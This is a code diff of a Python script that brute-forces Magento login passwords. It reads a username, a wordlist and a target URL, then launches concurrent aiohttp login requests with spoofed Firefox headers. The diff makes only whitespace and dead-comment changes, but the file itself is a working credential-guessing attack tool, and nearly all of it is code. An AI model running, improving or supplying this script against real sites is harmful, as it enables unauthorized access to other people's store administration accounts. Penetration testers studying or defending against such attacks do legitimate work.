@@ -31,15 +31,16 @@ parser.add_argument("-u", help="The username to try to brute force the password.
 parser.add_argument("-w", help="The password wordlist fullpath to use")
 parser.add_argument("url", help="The url where the Magento login is located")
 
+
 async def gen(wordlist):
     with open(wordlist, 'rt') as f:
         for i in f.readlines():
             yield i.strip()
 
+
 async def do_request(url, username, password):
     hg = {"Origin": url, "Referer": url, "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
     hp = {"Content-Type":"application/x-www-form-urlencoded", "Origin":url, "Referer":url, "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
-    
     async with aiohttp.ClientSession() as session:
         async with session.get(url, headers=hg) as response:
             t = await response.text()
@@ -61,7 +62,6 @@ async def main(url, username, wordlist):
     tasks = []
     try:
         print(desc)
-
         resume = f'''
 [i] Preparing tasks to bruteforce:
     - Magento URL: {url}
@@ -72,27 +72,18 @@ async def main(url, username, wordlist):
         print("")
         async for i in gen(wordlist):
             tasks.append(asyncio.create_task(do_request(url, username, i)))
-
         await asyncio.wait(tasks)
     except Exception as e:
         print(e)
 
 
 
-# async def main():    
-#     tasks = []
-#     async for i in gen():
-#         tasks.append(asyncio.create_task(do_request(i)))
-#     await asyncio.wait(tasks)
-
 if __name__ == "__main__":
     try:
         args = parser.parse_args()
-
         username = args.u
         wordlist = args.w
         url = args.url
-
         loop = asyncio.get_event_loop()
         loop.run_until_complete(main(url, username, wordlist))
     except :
